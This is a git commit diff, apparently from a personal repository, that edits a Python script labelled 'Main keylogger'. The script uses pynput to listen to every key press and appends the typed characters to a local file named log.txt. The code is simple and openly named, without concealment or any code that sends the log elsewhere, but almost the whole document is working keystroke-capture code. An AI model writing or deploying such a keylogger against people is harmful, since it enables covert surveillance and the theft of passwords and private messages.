5d306f43d5fcb72361042e3453ef530b48a296c1
Alejandro Sandoval <asandoval2540@gmail.com>
2026-02-13 11:03:48 -0600

    Add files via upload

--- Main.py
+++ Main.py
@@ -1,11 +1,20 @@
 #Main keylogger
+
+#Import Modules
 import pynput
 from pynput import keyboard
-import logging
 
+#Function to log key presses
 def Keypress(key):
     print(str(key))
-    with open("log.txt", "a") as log:
+    with open("log.txt", "a") as logKey:   #Open log file to write
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Error logging key")   #If this is shown, it means the key is not a character (space, enter, etc.)
+
+#Main function (Used to listen)        
 if __name__ == "__main__":
     listner = keyboard.Listener(on_press=Keypress)
     listner.start()
